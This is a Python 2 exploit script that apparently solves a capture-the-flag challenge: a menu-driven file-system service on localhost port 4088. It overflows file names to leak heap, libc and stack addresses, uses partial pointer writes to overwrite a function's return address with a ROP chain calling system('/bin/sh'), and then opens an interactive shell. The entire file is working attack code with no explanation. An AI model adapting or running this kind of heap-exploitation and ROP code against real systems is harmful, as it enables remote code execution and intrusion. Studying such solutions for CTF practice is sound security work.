#!/usr/bin/python3
import socket, struct, telnetlib
import sys

is_fin = False


def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)


def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
      data += f.read(1)
    return data


def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
def p64(a): return struct.pack("<Q",a)
def u64(a): return struct.unpack("<Q",a)[0]


splitter = '**************************************'
ls_splitter = '----------------------'


def ls():
    print('[+] ls')
    read_until(f, 'Your choice:')
    f.write('1\n')
    read_until(f, '-\n')
    content = read_until(f, ls_splitter)
    print content
    return content


def cd(name):
    print('[+] cd {}'.format(name))
    read_until(f, 'Your choice:')
    f.write('2\n')
    read_until(f, 'Choose a Folder :')
    f.write(name + '\n')


def make_folder(name):
    print('[+] make folder: {}'.format(name))
    read_until(f, 'Your choice:')
    f.write('3\n')
    read_until(f, 'Name of Folder:')
    f.write(name + '\n')


def create_file(name, size):
    print('[+] create file: {}/{}({})'.format(name, size, hex(size)))
    read_until(f, 'Your choice:')
    f.write('4\n')
    read_until(f, 'Name of File:')
    f.write((name + '\n')[:0x1f])
    read_until(f, 'Size of File:')
    print str(size)
    f.write(str(size) + '\n')


def remove(name):
    print('[+] remove {}'.format(name))
    read_until(f, 'Your choice:')
    f.write('5\n')
    read_until(f, 'Choose a Folder or file :')
    f.write(name + '\n')


def calculate_size():
    print('[+] calculate size')
    read_until(f, 'Your choice:')
    f.write('6\n')
    if is_fin:
        return
    content = read_until(f, splitter)[:-len(splitter)]
    return content


s, f = sock("127.0.0.1", 4088)


# Leak heap addr.
create_file('A' * 0x18, 0)
#create_file('A' * 0x18, 28456)
create_file('gargage_file', 0)
data = calculate_size()
remove('A' * 0x18)
remove('gargage_file')

print data

data = data[0x18:data.find(' : size')]
addr_heap = u64(data.ljust(8, '\0'))
addr_root = addr_heap - 0x78
addr_heap_base = addr_heap - 0x88
print '[+] addr_heap_base = {}'.format(hex(addr_heap_base))


# Change root entry's children to fd to leak libc addr.
addr_root_children = addr_heap_base + 0x10
addr_fd_ptr = addr_heap_base + 0xa0
print '[+] addr_root_children = {}'.format(hex(addr_root_children))
print '[+] addr_fd_ptr = {}'.format(hex(addr_fd_ptr))

u16 = lambda x: struct.unpack('H', x)[0]

create_file('libc', 0)
create_file('B' * 0x18 + p64(addr_root_children), u16(p64(addr_fd_ptr - 0x58)[:2]))
create_file('C' * 0x18 + p64(addr_root_children + 2), u16(p64(addr_fd_ptr - 0x58)[2:4]))
create_file('D' * 0x18 + p64(addr_root_children + 4), u16(p64(addr_fd_ptr - 0x58)[4:6]))
create_file('E' * 0x18 + p64(addr_root_children + 6), u16(p64(addr_fd_ptr - 0x58)[6:]))
remove('libc')
data = calculate_size()
data = ls()
data = data[:data.find('B' * 0x18) - 1].ljust(8, '\0')
addr_fd = u64(data)
addr_libc_base = addr_fd -  0x3c4b78

print '[+] addr_libc_base = {}'.format(hex(addr_libc_base))


# Leak stack address from environ
addr_environ = addr_libc_base + 0x3c6f38
make_folder('environ')
cd('environ')
addr_environ_children = addr_heap_base + 0xf8 - 0x58 # children ptrs of environ dir

print '[+] Overwrite {} @ {}'.format(hex(addr_environ - 0x58), hex(addr_environ_children))

create_file('stack', 0)
create_file('F' * 0x18 + p64(addr_environ_children), u16(p64(addr_environ - 0x58)[:2]))
create_file('G' * 0x18 + p64(addr_environ_children + 2), u16(p64(addr_environ - 0x58)[2:4]))
create_file('H' * 0x18 + p64(addr_environ_children + 4), u16(p64(addr_environ - 0x58)[4:6]))
create_file('I' * 0x18 + p64(addr_environ_children + 6), u16(p64(addr_environ - 0x58)[6:]))
remove('stack')
data = calculate_size()
data = ls()
data = data[:data.find('F' * 0x18) - 1].ljust(8, '\0')
environ = u64(data)

cd('..')

# Stack address where the return pointer is stored
addr_calc_ret_addr = environ - 0x110
print '[+] environ = {}'.format(hex(environ))
print '[+] addr_calc_ret_addr = {}'.format(hex(addr_calc_ret_addr))


make_folder('text')
cd('text')
addr_text_children = addr_heap_base + 0x370

print '[+] Overwrite {} @ {}'.format(hex(addr_calc_ret_addr - 0x58), hex(addr_text_children))

create_file('base', 0)
create_file('J' * 0x18 + p64(addr_text_children), u16(p64(addr_calc_ret_addr - 0x58)[:2]))
create_file('K' * 0x18 + p64(addr_text_children + 2), u16(p64(addr_calc_ret_addr - 0x58)[2:4]))
create_file('L' * 0x18 + p64(addr_text_children + 4), u16(p64(addr_calc_ret_addr - 0x58)[4:6]))
create_file('M' * 0x18 + p64(addr_text_children + 6), u16(p64(addr_calc_ret_addr - 0x58)[6:]))
remove('base')
data = calculate_size()
data = ls()
data = data[:data.find('J' * 0x18) - 1].ljust(8, '\0')[5:5+8][:-2].ljust(8, '\0')
addr_text_base = u64(data) - 0x1602
print '[+] addr_text_base = {}'.format(hex(addr_text_base))
cd('..')


# ROP chain on heap
pop_rdi = addr_libc_base + 0x21102
bin_sh = addr_libc_base + 0x18cd57
addr_system = addr_libc_base + 0x45390


# Overwrite return address of calculate size to ROP chain
addr_rop = addr_heap_base + 0xf8
make_folder('ROP')
cd('ROP')

buf = ''
buf += p64(pop_rdi)
buf += p64(bin_sh)
buf += p64(addr_system)
create_file(buf, 0)

addr_stack_pivot = addr_libc_base + 0x1f930
addr_rop_chain = addr_heap_base + 0x968
original_val = addr_text_base + 0x1669

print '[+] Overwrite {} @ {}'.format(hex(addr_rop_chain), hex(addr_calc_ret_addr))

create_file('shell', 0)
create_file('J' * 0x18 + p64(addr_calc_ret_addr), u16(p64(addr_rop_chain - original_val)[:2]))
create_file('K' * 0x18 + p64(addr_calc_ret_addr + 2), u16(p64(addr_rop_chain - original_val)[2:4]))
create_file('L' * 0x18 + p64(addr_calc_ret_addr + 4), u16(p64(addr_rop_chain - original_val)[4:6]))
create_file('M' * 0x18 + p64(addr_calc_ret_addr + 6), u16(p64(addr_rop_chain - original_val)[6:]))
remove('shell')
is_fin = True

calculate_size()

read_until(f)

shell(s)
